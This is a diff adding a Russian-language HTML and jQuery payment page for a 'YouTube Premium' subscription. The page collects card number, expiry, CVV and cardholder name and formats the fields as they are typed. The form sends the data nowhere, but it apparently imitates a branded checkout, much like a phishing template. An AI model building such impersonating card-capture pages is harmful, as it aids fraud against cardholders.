@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html class="html" lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Оплата</title>
+  <link type="text/css" href="css.css" rel="stylesheet">
+  <!--  <link rel="icon" href="favicon.ico">-->
+  <!--  <link rel="icon" href="img/favicon/icon.svg" type="image/svg+xml">-->
+  <!--  <link rel="apple-touch-icon" href="img/favicon/180.png">-->
+  <link rel="preload" href="fonts/Inter-Bold.ttf" as="font">
+  <link rel="preload" href="fonts/Inter-Medium.ttf" as="font">
+  <link rel="preload" href="fonts/Inter-Regular.ttf" as="font">
+  <link rel="preload" href="fonts/Inter-SemiBold.ttf" as="font">
+  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
+</head>
+<body class="body">
+<div class="container">
+  <main class="main">
+    <div class="information-payment">
+<!--      <div class="logo-container">-->
+<!--        <div class="logo-wrapper">-->
+<!--        <img src="icons8-монета-64.png" class="some-logo" width="30" height="30" alt="logo">-->
+<!--        </div>-->
+<!--        <p class="logo-title">Лого</p>-->
+<!--      </div>-->
+      <p class="payment-title">Оплата за подписку YouTube Premium</p>
+      <div class="check-wrapper">
+        <p class="payment-check">Сумма к оплате</p>
+        <div class="sum-wrapper">
+          <p class="payment-sum">623.<sup>49</sup></p>
+          <p class="payment-currency">руб.</p>
+        </div>
+      </div>
+      <p class="attention">Внимание! Оплата карточкой ОАО “СберБанк” не принимается</p>
+    </div>
+    <div class="information-card">
+      <form class="form-payment">
+        <div class="form-container">
+          <label class="text-card card-number-label" for="card-number-input">Номер карты</label>
+          <div class="card-number">
+<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
+<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
+<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
+<!--            <div><input type="text" maxlength="4" inputmode='numeric' pattern="\d+" placeholder="____" class="card-number-input" required></div>-->
+            <div><input type="text" id="card-number-input" class="card-number-input" inputmode="numeric" pattern="\d{4}\s?\d{4}\s?\d{4}\s?\d{4}" placeholder="____  ____  ____  ____" maxlength="19" required></div>
+          </div>
+          <div class="date-container">
+            <div>
+              <label for="card-date-input" class="text-card">мм / гг</label>
+              <div class="date-wrapper">
+                <div>
+                  <input type="text" id="card-date-input" class="card-date-input" inputmode="numeric" pattern="\d\d/\d\d" maxlength="5" placeholder="__/__" required>
+                </div>
+              </div>
+            </div>
+            <div>
+              <label for="card-cvc-input" class="text-card">CVV2/CVC2</label>
+              <div class="cvc-wrapper"><input type="text" maxlength="3" inputmode="numeric" pattern="\d+" placeholder="___" class="card-cvc-input" id="card-cvc-input" required></div>
+            </div>
+          </div>
+          <div>
+            <label for="card-holder-input" class="text-card">Имя фамилия</label>
+            <div class="holder-wrapper"><input class="card-holder-input" id="card-holder-input" type="text" inputmode="text" placeholder="________________________" maxlength="120" required></div>
+          </div>
+        </div>
+        <div class="button-wrapper">
+          <button class="card-submit">Оплатить</button>
+        </div>
+      </form>
+      <div class="security-container">
+        <div class="img-wrapper">
+          <svg class="svg-shield" width="35" height="35" viewBox="0 0 23 27" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M8.61054 19.647L18.434 9.8235L16.7105 8.1L8.61054 16.1426L5.45042 12.9825L3.72691 14.706L8.61054 19.647ZM11.0799 0L22.1094 4.941V12.294C22.1094 19.0732 17.399 25.4498 11.0799 27C4.76079 25.4486 0.050415 19.0721 0.050415 12.294V4.941L11.0799 0Z" fill="#B3B4B6"/>
+          </svg>
+        </div>
+        <p class="security-text">Данные покупателя защищены</p>
+      </div>
+    </div>
+  </main>
+</div>
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+    $(document).ready(function(){
+        $(".card-number-input").keyup(function () {
+            if (this.value.length == this.maxLength) {
+                        $('.card-date-input').eq(0).focus();
+            }
+        });
+    });
+
+    // $(".card-number-input").eq(3).keyup(function () {
+    //     if (this.value.length == this.maxLength) {
+    //         $('.card-date-input').eq(0).focus();
+    //     }
+    // });
+
+    $(".card-date-input").keyup(function () {
+        if (this.value.length == this.maxLength) {
+            $('.card-cvc-input').eq(0).focus();
+        }
+    });
+
+    $(".card-date-input").eq(1).keyup(function () {
+        if (this.value.length == this.maxLength) {
+            $('.card-cvc-input').eq(0).focus();
+        }
+    });
+
+    $(".card-cvc-input").eq(0).keyup(function () {
+        if (this.value.length == this.maxLength) {
+            $('.card-holder-input').eq(0).focus();
+        }
+    });
+
+    const paymentSum = document.querySelector('.payment-sum');
+    const amount = paymentSum.textContent;
+    const button = document.querySelector('.card-submit');
+    const paymentCurrency = document.querySelector('.payment-currency')
+    const currency = paymentCurrency.textContent;
+
+    button.textContent = 'Оплатить ' + amount + ' ' + currency;
+
+    const cardNumberInput = document.querySelector('.card-number-input');
+
+    cardNumberInput.addEventListener('input', (event) => {
+        const input = event.target;
+        const inputLength = input.value.length;
+
+        // Разделяем введенные символы на группы по четыре
+        if (inputLength > 0 && inputLength % 5 === 0) {
+            input.value = input.value.slice(0, inputLength - 1) + ' ' + input.value.slice(inputLength - 1);
+        }
+    });
+
+    const expiryInput = document.querySelector('.card-date-input');
+
+    expiryInput.addEventListener('input', (event) => {
+        const input = event.target;
+        const inputLength = input.value.length;
+
+        // Добавляем символ "/" после ввода двух символов
+        if (inputLength === 2 && input.value.indexOf('/') === -1) {
+            input.value = input.value + '/';
+        }
+    });
+
+</script>
+</body>
+</html>
